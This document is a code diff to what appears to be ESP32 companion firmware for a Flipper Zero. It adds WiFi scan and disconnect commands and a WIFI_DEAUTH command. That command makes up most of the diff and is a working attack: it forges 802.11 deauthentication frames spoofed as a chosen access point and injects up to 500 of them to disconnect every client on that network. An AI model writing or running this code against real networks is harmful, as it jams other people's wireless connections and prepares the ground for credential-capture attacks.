@@ -22,6 +22,7 @@
 
 #include <WiFi.h>
 #include <HTTPClient.h>
+#include <esp_wifi.h>
 
 // UART to Flipper Zero
 #define FLIPPER_SERIAL Serial1
@@ -188,6 +189,94 @@ void handle_command(String& cmd) {
         } else {
             send_response("ERROR:Connection failed");
         }
+    } else if (cmd == "WIFI_DISCONNECT") {
+        WiFi.disconnect();
+        delay(100);
+        send_response("OK");
+    } else if (cmd == "WIFI_SCAN") {
+        Serial.println("Scanning WiFi networks...");
+        int n = WiFi.scanNetworks();
+        if (n < 0) {
+            send_response("ERROR:Scan failed");
+            return;
+        }
+
+        for (int i = 0; i < n; i++) {
+            char line[128];
+            snprintf(line, sizeof(line), "%ddBm|CH%d|%s|%s",
+                WiFi.RSSI(i),
+                WiFi.channel(i),
+                (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "OPEN" : "LOCKED",
+                WiFi.SSID(i).c_str());
+            send_response(line);
+        }
+
+        WiFi.scanDelete();
+        send_response("DONE");
+    } else if (cmd.startsWith("WIFI_DEAUTH ")) {
+        // Deauth requires raw 802.11 frame injection
+        // Parse: WIFI_DEAUTH <bssid> [count]
+        String args = cmd.substring(12);
+        args.trim();
+
+        int spaceIdx = args.indexOf(' ');
+        String bssidStr;
+        int count = 50;
+
+        if (spaceIdx > 0) {
+            bssidStr = args.substring(0, spaceIdx);
+            count = args.substring(spaceIdx + 1).toInt();
+            if (count <= 0) count = 50;
+            if (count > 500) count = 500;
+        } else {
+            bssidStr = args;
+        }
+
+        // Parse MAC address
+        uint8_t bssid[6];
+        int parsed = sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+
+        if (parsed != 6) {
+            send_response("ERROR:Invalid BSSID format (XX:XX:XX:XX:XX:XX)");
+            return;
+        }
+
+        // Deauth frame template (IEEE 802.11)
+        uint8_t deauth_frame[26] = {
+            0xC0, 0x00,                         // Frame Control: Deauthentication
+            0x00, 0x00,                         // Duration
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: target BSSID
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: target
+            0x00, 0x00,                         // Sequence number
+            0x07, 0x00                          // Reason: Class 3 frame from nonassociated STA
+        };
+
+        // Set source and BSSID to target AP
+        memcpy(deauth_frame + 10, bssid, 6);
+        memcpy(deauth_frame + 16, bssid, 6);
+
+        // Need to be in promiscuous mode for raw frame injection
+        esp_wifi_set_mode(WIFI_MODE_STA);
+        esp_wifi_start();
+        esp_wifi_set_promiscuous(true);
+
+        int sent = 0;
+        for (int i = 0; i < count; i++) {
+            deauth_frame[22] = (i & 0xFF);
+            deauth_frame[23] = ((i >> 8) & 0x0F);
+            if (esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false) == ESP_OK) {
+                sent++;
+            }
+            delay(2);
+        }
+
+        esp_wifi_set_promiscuous(false);
+
+        char result[64];
+        snprintf(result, sizeof(result), "Sent %d/%d deauth frames", sent, count);
+        send_response(result);
     } else if (cmd.startsWith("DOWNLOAD ")) {
         String url = cmd.substring(9);
         url.trim();
